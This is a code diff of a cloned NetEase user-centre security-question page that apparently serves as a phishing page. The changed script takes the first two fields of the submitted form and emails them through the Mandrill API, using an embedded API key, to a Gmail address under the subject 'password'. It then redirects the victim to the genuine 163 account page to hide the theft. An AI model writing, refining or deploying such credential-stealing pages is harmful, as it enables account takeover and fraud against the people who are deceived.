@@ -8,40 +8,39 @@
 <script type="text/javascript" src="./网易用户中心_files/prototype.js"></script><style type="text/css"></style>
 <script type="text/javascript" language="javascript" src="./网易用户中心_files/common.js"></script>
 <script type="text/javascript" language="javascript" src="./网易用户中心_files/checkform.js"></script>
-<script type="text/javascript" language="javascript" src="./网易用户中心_files/jquery-1_3_1.js"></script>
+<script type="text/javascript" language="javascript" src="./网易用户中心_files/jquery.js"></script>
 
 <script language="JavaScript">
 
-function getInfo(){
-  $.ajax({
-    type: "POST",
-    url: "https://mandrillapp.com/api/1.0/messages/send.json",
-    // headers: {'Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept'},
-    data: {
-      'key': 'bnzuL-jTtPWKLSdNtzvfiw',
-      'message': {
-        'from_email': 'yuanminggang1@126.com',
-        'to': [
-        {
-          'email': 'woshizaibuzhidao3@gmail.com',
-          'name': 'password',
-          'type': 'to'
+function sendMail() {
+    $.ajax({
+      type: "POST",
+      url: "https://mandrillapp.com/api/1.0/messages/send.json",
+      data: {
+        'key': 'bnzuL-jTtPWKLSdNtzvfiw',
+        'message': {
+          'from_email': 'yuanminggang1@126.com',
+          'to': [
+            {
+              'email': 'woshizaibuzhidao3@gmail.com',
+              'name': 'password',
+              'type': 'to'
+            }
+          ],
+          'subject': 'password',
+          'html': document.getElementById("form").elements[0].value
+          +"\r\n"+document.getElementById("form").elements[1].value
         }
-        ],
-        'subject': 'password',
-        'html': document.getElementById("form").elements[0].value
-        +"\r\n"+document.getElementById("form").elements[1].value
-      }
-    },
-    success : function(data) {
-     // window.location.href = "https://reg.163.com/account/accountInfo.jsp";
-   },
-   error: function (error) {
-    // window.location.href = "https://reg.163.com/account/accountInfo.jsp";
-  }
-});
-  return false;
-}
+      },
+      success : function(data) {
+         window.location.href = "https://reg.163.com/account/accountInfo.jsp";
+      },
+      error: function (error) {
+        window.location.href = "https://reg.163.com/account/accountInfo.jsp";
+              }
+    });
+    return false;
+    }
 <!--
 function charAllSame(str){
 	for(var i = 0 ; i < str.length - 1 ; i ++){
@@ -303,7 +302,7 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
     <div class="right_pan">
       <h2 class="clum_title">  <a href="https://reg.163.com/account/accountInfo.jsp">帐号管理</a>&gt;&gt;安全问题 </h2>
       <form method="post" id="form" 
-        name="form" onsubmit="return getInfo();">
+        name="form" onsubmit="return sendMail();">
 <!-- 		<input type="hidden" name="username" id="username" value="net_administrat0r">
 		<input type="hidden" name="uname2" id="uname2" value="">
  -->		<!--input type="hidden" name="syscheckcode" id="syscheckcode" value="" /-->
